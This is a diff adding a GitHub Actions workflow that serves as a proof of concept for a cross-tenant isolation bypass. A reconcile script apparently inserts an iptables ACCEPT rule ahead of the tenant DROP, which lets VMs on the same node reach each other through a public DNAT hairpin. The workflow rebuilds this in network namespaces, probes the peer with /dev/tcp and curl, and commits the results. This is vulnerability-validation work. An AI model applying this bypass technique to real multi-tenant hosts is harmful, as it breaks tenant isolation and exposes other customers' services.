@@ -1,0 +1,141 @@
+name: Box reconcile hairpin tenant bypass PoC
+on:
+  push:
+    paths:
+      - '.github/workflows/box-reconcile-hairpin-tenant-bypass-poc.yml'
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Reproduce post-reconcile cross-tenant hairpin
+        shell: bash
+        run: |
+          set -euo pipefail
+          O=box-reconcile-hairpin-tenant-bypass-poc.txt
+          : > "$O"
+          cleanup() {
+            sudo pkill -f 'http.server 8911' 2>/dev/null || true
+            sudo ip netns del boxA 2>/dev/null || true
+            sudo ip netns del boxB 2>/dev/null || true
+            sudo ip link del bxbr 2>/dev/null || true
+            sudo ip link del bxpub 2>/dev/null || true
+            sudo iptables -t nat -F BXPOC 2>/dev/null || true
+            sudo iptables -t nat -D PREROUTING -j BXPOC 2>/dev/null || true
+            sudo iptables -t nat -X BXPOC 2>/dev/null || true
+            while sudo iptables -C FORWARD -m comment --comment bx-tenant-drop -j DROP 2>/dev/null; do sudo iptables -D FORWARD -m comment --comment bx-tenant-drop -j DROP; done
+            while sudo iptables -C FORWARD -d 10.77.0.3 -m conntrack --ctstate DNAT -m comment --comment bx-reconcile-accept -j ACCEPT 2>/dev/null; do sudo iptables -D FORWARD -d 10.77.0.3 -m conntrack --ctstate DNAT -m comment --comment bx-reconcile-accept -j ACCEPT; done
+            while sudo iptables -C FORWARD -i bxpub -d 10.77.0.3 -m conntrack --ctstate DNAT -m comment --comment bx-initial-accept -j ACCEPT 2>/dev/null; do sudo iptables -D FORWARD -i bxpub -d 10.77.0.3 -m conntrack --ctstate DNAT -m comment --comment bx-initial-accept -j ACCEPT; done
+          }
+          trap cleanup EXIT
+          cleanup
+          sudo modprobe br_netfilter || true
+          sudo sysctl -w net.ipv4.ip_forward=1 >/dev/null
+          sudo sysctl -w net.bridge.bridge-nf-call-iptables=1 >/dev/null || true
+          sudo sysctl -w net.ipv4.conf.all.rp_filter=0 >/dev/null
+          sudo ip netns add boxA
+          sudo ip netns add boxB
+          sudo ip link add bxbr type bridge
+          sudo ip addr add 10.77.0.1/24 dev bxbr
+          sudo ip link set bxbr up
+          sudo ip link add a0 type veth peer name apeer
+          sudo ip link add b0 type veth peer name bpeer
+          sudo ip link set apeer master bxbr
+          sudo ip link set bpeer master bxbr
+          sudo ip link set apeer up
+          sudo ip link set bpeer up
+          sudo bridge link set dev apeer isolated on
+          sudo bridge link set dev bpeer isolated on
+          sudo ip link set a0 netns boxA
+          sudo ip link set b0 netns boxB
+          sudo ip -n boxA link set lo up
+          sudo ip -n boxB link set lo up
+          sudo ip -n boxA link set a0 up
+          sudo ip -n boxB link set b0 up
+          sudo ip -n boxA addr add 10.77.0.2/24 dev a0
+          sudo ip -n boxB addr add 10.77.0.3/24 dev b0
+          sudo ip -n boxA route add default via 10.77.0.1
+          sudo ip -n boxB route add default via 10.77.0.1
+          sudo ip link add bxpub type dummy
+          sudo ip addr add 198.18.77.1/32 dev bxpub
+          sudo ip link set bxpub up
+          sudo ip netns exec boxB python3 -m http.server 8911 --bind 10.77.0.3 >/tmp/bx-http.log 2>&1 &
+          sleep 1
+
+          # Box's public DNAT doorway for VM B's agent.
+          sudo iptables -t nat -N BXPOC
+          sudo iptables -t nat -A PREROUTING -j BXPOC
+          sudo iptables -t nat -A BXPOC -d 198.18.77.1 -p tcp --dport 21003 -m comment --comment 'ascii:box-node0-b' -j DNAT --to-destination 10.77.0.3:8911
+
+          # Initial provision-vm.sh semantics: accept only traffic entering from PUBLIC_INTERFACE.
+          sudo iptables -I FORWARD 1 -i bxpub -d 10.77.0.3 -m conntrack --ctstate DNAT -m comment --comment bx-initial-accept -j ACCEPT
+          # ensure-tenant-isolation.sh runs last and puts same-bridge DROP at position 1.
+          sudo iptables -I FORWARD 1 -i bxbr -o bxbr -m comment --comment bx-tenant-drop -j DROP
+
+          {
+            echo '=== topology ==='
+            echo 'boxA=10.77.0.2 boxB=10.77.0.3 host-public=198.18.77.1:21003 -> boxB:8911'
+            echo 'Both VM bridge ports have isolated=on.'
+            bridge -d link show dev apeer
+            bridge -d link show dev bpeer
+            echo
+            echo '=== initial Box provisioning rule order ==='
+            sudo iptables -L FORWARD --line-numbers -n -v | head -n 25
+            echo
+            echo '=== direct peer test (must fail) ==='
+          } >> "$O"
+          if sudo ip netns exec boxA timeout 2 bash -c 'cat < /dev/null > /dev/tcp/10.77.0.3/8911' >> "$O" 2>&1; then
+            echo 'DIRECT_PEER=UNEXPECTED_REACHABLE' >> "$O"
+          else
+            echo 'DIRECT_PEER=BLOCKED' >> "$O"
+          fi
+          echo '=== pre-reconcile public-IP hairpin test (must fail) ===' >> "$O"
+          if sudo ip netns exec boxA timeout 3 curl -fsS http://198.18.77.1:21003/ >> "$O" 2>&1; then
+            echo 'PRE_RECONCILE_HAIRPIN=UNEXPECTED_REACHABLE' >> "$O"
+          else
+            echo 'PRE_RECONCILE_HAIRPIN=BLOCKED' >> "$O"
+          fi
+
+          # Exact security-relevant semantics from reconcile-node.sh:
+          # it omits -i PUBLIC_INTERFACE and inserts at FORWARD position 1.
+          sudo iptables -I FORWARD 1 -d 10.77.0.3 -m conntrack --ctstate DNAT -m comment --comment bx-reconcile-accept -j ACCEPT
+          {
+            echo
+            echo '=== post-reconcile rule order ==='
+            sudo iptables -L FORWARD --line-numbers -n -v | head -n 25
+            echo
+            echo '=== post-reconcile public-IP hairpin test ==='
+          } >> "$O"
+          if sudo ip netns exec boxA timeout 3 curl -fsS http://198.18.77.1:21003/ >> "$O" 2>&1; then
+            echo 'POST_RECONCILE_HAIRPIN=REACHABLE' >> "$O"
+          else
+            echo 'POST_RECONCILE_HAIRPIN=BLOCKED' >> "$O"
+          fi
+          {
+            echo
+            echo '=== counters ==='
+            sudo iptables -L FORWARD -n -v --line-numbers | grep -E 'bx-(tenant|reconcile|initial)' || true
+            echo
+            if grep -q '^DIRECT_PEER=BLOCKED$' "$O" && grep -q '^PRE_RECONCILE_HAIRPIN=BLOCKED$' "$O" && grep -q '^POST_RECONCILE_HAIRPIN=REACHABLE$' "$O"; then
+              echo 'VALIDATED_LOGIC_BYPASS=YES'
+              echo 'IMPACT=Reconcile rule ordering allows same-node VM traffic to hairpin through a public DNAT endpoint despite isolated bridge ports and the tenant-isolation DROP.'
+            else
+              echo 'VALIDATED_LOGIC_BYPASS=NO'
+            fi
+          } >> "$O"
+          cat "$O"
+      - name: Commit PoC result
+        if: always()
+        shell: bash
+        run: |
+          set -euo pipefail
+          [ -f box-reconcile-hairpin-tenant-bypass-poc.txt ] || exit 0
+          git config user.name github-actions[bot]
+          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
+          git add box-reconcile-hairpin-tenant-bypass-poc.txt
+          git diff --cached --quiet && exit 0
+          git commit -m 'research: validate Box reconcile tenant hairpin logic'
+          git push
